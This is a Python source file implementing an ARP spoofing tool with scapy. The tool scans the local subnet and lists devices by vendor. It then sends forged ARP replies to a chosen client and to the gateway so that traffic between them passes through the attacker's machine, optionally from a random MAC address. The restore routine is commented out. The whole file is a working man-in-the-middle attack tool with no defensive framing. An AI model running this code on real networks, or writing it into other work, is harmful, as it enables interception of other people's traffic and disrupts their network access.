import random
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP, ICMP
import netifaces
import time
from logging import getLogger

logger = getLogger(__name__)


class ARPSpoofer:

    def __init__(self):
        self.interface = self.get_interface()
        self.gateway_ip = self.get_gateway_ip()
        self.gateway_mac = self.get_gateway_mac()
        self.subnet_mask = self.get_subnet_mask()
        self.host_ip = self.get_host_ip()
        self.host_mac = self.get_host_mac()
        self.mac_resolver = self.get_mac_resolver()
        self.spoofed_clients = []

    def get_mac_resolver(self):
        resolver = {}
        with open("oui.txt", "r", encoding="utf-8") as oui:
            text = oui.readlines()
            text = "\n".join(text)
            resolver_data = text.split("\n\n\n")  # Remove empty lines
            for one_resolver_data in resolver_data:
                line = one_resolver_data.split("\n")[1]
                mac = line.split("   ")[0]
                address = line.split("\t")[-1]
                resolver[mac] = address
        return resolver

    def get_gateway_ip(self):
        logger.debug("")
        gateways = netifaces.gateways()
        if "default" in gateways and netifaces.AF_INET in gateways["default"]:
            return gateways["default"][netifaces.AF_INET][0]

    def get_interface(self):
        gateways = netifaces.gateways()
        if "default" in gateways and netifaces.AF_INET in gateways["default"]:
            return gateways["default"][netifaces.AF_INET][1]

    def get_gateway_mac(self):
        return self.get_mac_by_ip(self.gateway_ip)

    def get_subnet_mask(self):
        addresses = netifaces.ifaddresses(self.interface)
        return addresses[netifaces.AF_INET][0]["netmask"]

    def get_host_ip(self):
        addresses = netifaces.ifaddresses(self.interface)
        return addresses[netifaces.AF_INET][0]["addr"]

    def get_host_mac(self):
        addrs = netifaces.ifaddresses(self.interface)
        return addrs[netifaces.AF_LINK][0]["addr"]

    def get_mac_by_ip(self, ip_address):
        packet = ARP(pdst=ip_address)
        response = sr1(packet, timeout=3, verbose=False)

        if response is not None:
            return response.hwsrc
        else:
            raise ScapyNoDstMacException

    def scan_network(self, scanning_method):
        if scanning_method == "arp":
            host_bits = self.get_host_bits(self.subnet_mask)
            network_ip = self.gateway_ip + "/" + str(host_bits)
            print(f"Running scan on network address: {network_ip}")

            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_ip)

            result = srp(arp_request, timeout=3, verbose=False)[0]
            arp_responses = []

            for sent, received in result:
                # try:
                #     hostname = socket.gethostbyaddr(received.psrc)[0]
                # except socket.herror:
                #     hostname = "Unknown"
                arp_responses.append(
                    {
                        "IP": received.psrc,
                        "MAC": received.hwsrc,
                        # 'Hostname': hostname
                    }
                )

            sorted_data = sorted(arp_responses, key=lambda x: x["MAC"])

            print("IP\t\tMAC\t\t\tDEVICE")
            for client in sorted_data:
                try:
                    mac_resolved = self.mac_resolver[
                        client["MAC"][:8].replace(":", "-").upper()
                    ]
                except Exception as e:
                    mac_resolved = ""
                print(f'{client["IP"]}\t{client["MAC"]}\t{mac_resolved}')
        elif scanning_method == 'nmap':
            pass

    def spoof_mac(self, client_ip, spoof_source=False):

        if not self.is_client_present(client_ip):
            raise Scapy_Exception(f"Client IP {client_ip} not present on network")

        self.spoofed_clients.append(
            {"original_IP": client_ip, "original_MAC": self.get_mac_by_ip(client_ip)}
        )

        packets = self._create_spoofed_packets(client_ip, spoof_source)
        print("Sending packets for spoofing MAC")

        # while True:
        [sendp(x, verbose=False) for x in packets]
            # time.sleep(0.1)

    # def restore_mac(self):
    #     for client in self.spoofed_clients:
    #         self.spoofed_clients.remove(client)
    #         if not self.is_client_present(client['IP']):
    #             logger.exception(f'Client with IP {client['IP']} not present in network')
    #             continue
    #         packets = self._create_original_packets(client['IP'],client['MAC'])
    #         [sendp(x, verbose=False) for x in packets]

    def is_client_present(self, client_ip):
        icmp_packet = (
            IP(
                dst=client_ip,
            )
            / ICMP()
        )

        response = sr1(icmp_packet, timeout=2, verbose=False)
        if response is None:
            return False
        return True

    def get_host_bits(self, subnet_mask):
        octets = subnet_mask.split(".")
        binary_mask = "".join([bin(int(octet))[2:].zfill(8) for octet in octets])
        host_bits = 0
        for bit in binary_mask:
            if bit == "1":
                host_bits += 1
            else:
                break
        return host_bits

    def report_net_status(self):
        return {
            "gateway_ip": self.gateway_ip,
            "gateway_mac": self.gateway_mac,
            "interface": self.interface,
            "subnet_mask": self.subnet_mask,
            "host_ip": self.host_ip,
            "host_mac": self.host_mac,
            # 'scanned_hosts': self.scan_network()
        }

    def _create_spoofed_packets(self, client_ip, spoof_source):
        logger.debug("Creating packets for spoofing")

        gateway_ip = self.gateway_ip
        gateway_mac = self.gateway_mac
        client_mac = self.get_mac_by_ip(client_ip)
        host_mac = self.host_mac
        if spoof_source:
            host_mac = self.generate_random_mac()

        packets = []
        client_packet = Ether(dst=client_mac, src=host_mac) / ARP(
            pdst=client_ip, psrc=gateway_ip
        )
        gateway_packet = Ether(dst=gateway_mac, src=host_mac) / ARP(
            pdst=gateway_ip, psrc=client_ip
        )

        packets.append(client_packet)
        packets.append(gateway_packet)

        logger.debug(f"Packets generated: {packets}")

        return packets

    def _create_original_packets(self, client_ip, client_mac):
        logger.debug("Creating packets for restoring original IP-MAC")

        gateway_ip = self.gateway_ip
        gateway_mac = self.gateway_mac

        packets = []
        client_packet = Ether(dst=ETHER_BROADCAST, src=client_mac) / ARP(
            pdst=client_ip, psrc=gateway_ip
        )
        gateway_packet = Ether(dst=ETHER_BROADCAST, src=gateway_mac) / ARP(
            pdst=gateway_ip, psrc=client_ip
        )

        packets.append(client_packet)
        packets.append(gateway_packet)

        logger.debug(f"Packets generated: {packets}")

        return packets

    def generate_random_mac(self):
        mac = [random.randint(0x00, 0xFF) for _ in range(6)]
        mac[0] &= 0xFE  # Ensure the MAC address is unicast and not multicast
        return ":".join(map(lambda x: "%02x" % x, mac))
